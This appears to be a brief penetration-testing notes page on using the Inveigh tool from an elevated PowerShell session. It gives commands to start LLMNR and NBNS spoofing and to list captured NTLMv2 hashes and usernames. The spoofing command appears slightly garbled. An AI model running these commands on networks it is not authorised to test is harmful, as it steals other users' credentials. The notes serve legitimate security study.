https://github.com/Kevin-Robertson/Inveigh
need evelated powershell
  
From a win-rm powershell session
- Import-Module ./Inveigh.ps1
- OR ./Inveigh.exe
  
Once Inveigh is imported, we can set up LLMNR and NBNS spoofing
```JavaScript
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
![image 231.png](../../assets/From%20Windows/image%20231.png)
![image 1 168.png](../../assets/From%20Windows/image%201%20168.png)
  
can press esc to enter and exit interactive console
- once in interactive console, type HELP to see modules
  
can get unique NTLMv2 hashes with “GET NTLMV2UNIQUE”
![image 2 147.png](../../assets/From%20Windows/image%202%20147.png)
  
can get usernames with GET NTLMV2USERNAMES
![image 3 131.png](../../assets/From%20Windows/image%203%20131.png)